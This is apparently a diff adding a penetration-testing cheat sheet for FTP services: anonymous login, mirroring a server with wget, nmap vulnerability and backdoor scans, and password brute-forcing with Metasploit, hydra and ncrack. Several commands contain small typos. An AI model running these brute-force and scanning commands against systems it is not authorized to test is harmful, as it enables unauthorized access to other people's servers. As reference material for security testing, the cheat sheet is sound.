@@ -1,0 +1,51 @@
+# One of the first things we may try is to perform an anonymous login, this can be
+# done by logging with username equal to "anonymous" and a blank password or using
+# as password "anonymous" again.
+
+Example of anonymous login and file download:
+```sh
+telnet <FTP_ip_address> <port> (default:21)
+USER anonymous
+331 Anonymous login ok, send complete email address as your password
+PASS <email></email>
+230 Anonymous access granted, restrictions apply
+CWD <directory>
+250 CWD command successful
+PASV
+227 Entering Passive Mode (64,170,98,33,151,31).
+RETR <file></file>
+150 Opening ASCII mode data connection for <ftp_server></ftp_server> (6060 bytes)
+226 Transfer complete
+QUIT
+221 Goodbye.
+```
+
+Other useful FTP commands:
+```sh
+cd <directory> - change remote directory
+lcd <directory> - change local directory
+put <file> - upload file
+get <file> - download file
+```
+
+# Download entire FTP directory
+wget -m --no-passive ftp://anonoymous:anonymous@1.1.1.1
+
+# Test for common FTP vulnerabilities with nmap
+nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <target-ip>
+
+
+# Bruteforce ftp login with metasploit module
+msf> use auxiliary/scanner/ftp/ftp_login
+msf> set RHOSTS 192.168.69.50-254
+msf> set THREADS 205
+msf> set USER_FILE <path to file>
+msf> set PASS_FILE <path to file>
+msf> run
+
+
+# Bruteforce ftp login with hydra
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <target-ip> ftp -V
+
+# Bruteforce ftp login with ncrack
+ncrack -U users.txt -P /usr/share/passwords.txt -f <target-ip>:ftp 
